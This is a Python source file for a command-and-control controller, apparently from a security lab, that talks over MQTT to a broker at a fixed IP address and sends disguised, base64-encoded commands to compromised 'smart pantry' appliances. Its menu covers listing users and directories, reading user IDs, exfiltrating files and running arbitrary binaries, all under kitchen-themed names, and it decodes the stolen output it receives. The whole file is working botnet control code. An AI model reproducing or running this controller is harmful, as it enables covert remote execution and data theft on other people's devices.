import paho.mqtt.client as mqtt
import json
import base64
import time

BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"


def on_message(client, userdata, msg):
    try:
        data = json.loads(msg.payload.decode())

        # Ignore our own outgoing commands
        if "order_type" in data:
            return

        if "appliance_id" in data:
            print(f"\n[+] Incoming Response from {data['appliance_id']}:")

            mappings = {
                "staff_list": "Logged-in Users (w)",
                "items": "Directory Listing (ls)",
                "chef_rank": "User ID (id)",
                "cycle_report": "Binary Execution Output",
                "ingredients": "File Exfiltration (Binary Data Received)"
            }

            for key, label in mappings.items():
                if key in data:
                    decoded = base64.b64decode(data[key]).decode(errors='replace')
                    print(f"--- {label} ---\n{decoded}")

            if "telemetry" in data:
                print(f"Fridge Health Status: {data['telemetry']}")
            if "error" in data:
                print(f"Kitchen Error: {data['error']}")
    except:
        pass


client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION1)
client.on_message = on_message
client.connect(BROKER, PORT)
client.subscribe(TOPIC)
client.loop_start()

print("--- Middle-earth Smart Pantry (C&C Controller) ---")
target = input("Target Appliance ID (e.g. SHIRE-FRIDGE-XXXXXX or 'ALL'): ")

while True:
    print("\n[Menu] 1:Ping | 2:w | 3:ls | 4:id | 5:cp | 6:exec | Q:Quit")
    choice = input("> ")

    cmd = {"appliance_id": target, "target": target}

    if choice == "1":
        cmd["order_type"] = "ping_fridge"
    elif choice == "2":
        cmd["order_type"] = "kitchen_staff"
    elif choice == "3":
        p = input("Shelf path (ls): ")
        cmd["order_type"] = "check_pantry"
        cmd["shelf_id"] = base64.b64encode(p.encode()).decode()
    elif choice == "4":
        cmd["order_type"] = "head_chef"
    elif choice == "5":
        p = input("File to export: ")
        cmd["order_type"] = "export_recipe"
        cmd["recipe_book"] = base64.b64encode(p.encode()).decode()
    elif choice == "6":
        p = input("Binary to run: ")
        cmd["order_type"] = "start_appliance"
        cmd["model_no"] = base64.b64encode(p.encode()).decode()
    elif choice.lower() == "q":
        break
    else:
        continue

    print("\n[Stealth Log] Sending Encrypted/Hidden Message:")
    print(f"Topic: {TOPIC}")
    print(f"Payload: {json.dumps(cmd, indent=2)}")
    print("-" * 40)

    client.publish(TOPIC, json.dumps(cmd))
    time.sleep(1.5)  # Wait for network round-trip
